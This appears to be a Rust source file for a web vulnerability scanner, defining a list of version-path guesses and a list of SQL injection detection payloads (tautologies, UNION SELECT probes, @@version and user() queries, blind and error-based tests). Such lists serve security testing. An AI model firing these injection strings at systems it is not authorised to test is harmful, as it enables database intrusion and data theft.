// File: payloads.rs
// contains the payloads defined to the moment of writing.

pub const versions_payload: [&str; 81] = [
    // Simple numeric versions
    "v1", "v2", "v3", "v4", "v5",          // Basic versioning
    "v1.0", "v1.1", "v2.0", "v2.1", "v3.0",// Sub-versions with decimals
    "v0.1", "v0.2", "v0.3",                // Early versions
    "1", "2", "3", "4", "5",               // Versions without 'v' prefix

    // Pre-release versions
    "alpha", "beta", "gamma",              // Alphabetical states
    "rc1", "rc2", "rc3", "release-candidate", // Release candidates
    "test1", "test2", "dev", "debug",      // Development and test versions
    "qa1", "qa2", "staging",               // QA and staging environments

    // Status-based versions
    "stable", "unstable", "latest",        // General states
    "deprecated", "legacy", "obsolete",    // Outdated versions
    "preview", "snapshot",                 // Preview and snapshot builds

    // Date-based versions
    "v2023", "v2024", "v2025",             // Yearly versions
    "2023-01", "2024-02", "2025-03",       // Year-month formats
    "v1-2023", "v2-2024",                  // Combined with numeric versions
    "v1_2023", "v2_2024",                  // Underscore instead of dash

    // Combined labels
    "v1-beta", "v2-alpha", "v3-rc1",       // Combined with pre-release tags
    "v1a", "v2a", "v3b",                   // Shortened alpha/beta suffixes
    "v1-final", "v2-final", "v3-release",  // Final release tags
    "v1-dev", "v2-test", "v3-qa",          // Development-focused tags

    // Semantic versions (semver)
    "1.0.0", "1.0.1", "1.1.0", "2.0.0",    // Major.minor.patch
    "1.0.0-beta", "1.0.0-alpha",           // Semantic with pre-release states
    "2.0.0-rc1", "2.0.0-rc2",              // Release candidates with semver

    // Special markers
    "null", "undefined", "default",        // Placeholder or default markers
    "vX", "vY", "vZ",                       // Unknown placeholders
    "any", "all", "*",                     // Wildcard versions
    "empty", "none",                       // Explicit no-version cases
];

pub static DETECTION_PAYLOADS: &[&str] = &[
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' AND 1=1 --",
    "\" AND 1=1 --",
    "' UNION SELECT NULL --",
    "\" UNION SELECT NULL --",
    "' OR '1'='1 --",
    "\" OR '1'='1 --",
    "' OR 'x'='x' --",
    "\" OR 'x'='x' --",
    "' OR EXISTS(SELECT * FROM users) --",
    "\" OR EXISTS(SELECT * FROM users) --",
    "' OR LENGTH((SELECT DATABASE())) > 1 --",
    "\" OR LENGTH((SELECT DATABASE())) > 1 --",
    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 77 --",
    "\" AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 77 --",
    "' OR LENGTH((SELECT @@version)) > 1 --",
    "\" OR LENGTH((SELECT @@version)) > 1 --",
    "' AND (SELECT 1/0) --",
    "\" AND (SELECT 1/0) --",
    "' OR 1=(SELECT 1/0) --",
    "\" OR 1=(SELECT 1/0) --",
    "' AND LENGTH((SELECT user())) > 5 --",
    "\" AND LENGTH((SELECT user())) > 5 --",
    "' UNION SELECT @@version --",
    "\" UNION SELECT @@version --",
    "' UNION SELECT NULL, NULL --",
    "\" UNION SELECT NULL, NULL --",
    "' OR 1=1 UNION SELECT NULL --",
    "\" OR 1=1 UNION SELECT NULL --",
    "' OR 1=1 /*",
    "\" OR 1=1 /*",
    "' UNION SELECT 1, 2, 3 --",
    "\" UNION SELECT 1, 2, 3 --",
    "' AND EXISTS(SELECT * FROM mysql.user) --",
    "\" AND EXISTS(SELECT * FROM mysql.user) --",
    "' OR QUOTE(NULL) IS NULL --",
    "\" OR QUOTE(NULL) IS NULL --",
    "' AND JSON_OBJECT('version', @@version) --",
    "\" AND JSON_OBJECT('version', @@version) --",
    "' OR JSON_QUOTE('admin') --",
    "\" OR JSON_QUOTE('admin') --",
    "' OR GROUP_CONCAT(user()) --",
    "\" OR GROUP_CONCAT(user()) --",
    "' AND TRUE --",
    "\" AND TRUE --",
    "' AND FALSE --",
    "\" AND FALSE --",
    "' AND 1=1; --",
    "\" AND 1=1; --",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR EXISTS(SELECT 1) --",
    "\" OR EXISTS(SELECT 1) --",
    "' OR 1=1",
    "1'1",
    "1 and 1=1",
    "1 or 1=1",
    "1' or '1'='1",
    "1or1=1",
    "1'or'1'='1",
    "fake@ema'or'il.nl'='il.nl",
    "1\\'1",
    "' or username is not NULL or username = '",
    "OR 1=1",
    "OR 1=0",
    "OR x=x",
    "OR x=y",
    "HAVING 1=1",
    "HAVING 1=0",
    "AND 1=1",
    "AND 1=0",
    "%20or%201=1",
    "or a=a",
    "or 'text' = 'text'",
];